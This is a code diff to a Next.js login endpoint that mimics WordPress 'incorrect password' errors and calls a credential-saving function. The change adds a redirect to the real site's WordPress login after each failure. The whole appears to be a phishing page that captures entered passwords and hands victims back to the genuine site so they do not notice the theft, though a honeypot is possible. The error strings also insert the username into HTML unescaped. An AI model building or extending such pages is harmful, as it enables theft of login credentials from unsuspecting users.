@@ -4,6 +4,7 @@ import {
   verifyAdminPassword,
 } from "@/lib/auth";
 import { saveLoginCredential } from "@/lib/credentials";
+import { REAL_SITE_URLS } from "@/lib/routes";
 
 export async function POST(request: NextRequest) {
   try {
@@ -13,6 +14,7 @@ export async function POST(request: NextRequest) {
       return NextResponse.json(
         {
           error: `The password you entered for the username <strong>${username || "admin"}</strong> is incorrect.`,
+          redirect: REAL_SITE_URLS.wpLogin,
         },
         { status: 401 }
       );
@@ -31,6 +33,7 @@ export async function POST(request: NextRequest) {
       return NextResponse.json(
         {
           error: `The password you entered for the username <strong>${username}</strong> is incorrect.`,
+          redirect: REAL_SITE_URLS.wpLogin,
         },
         { status: 401 }
       );
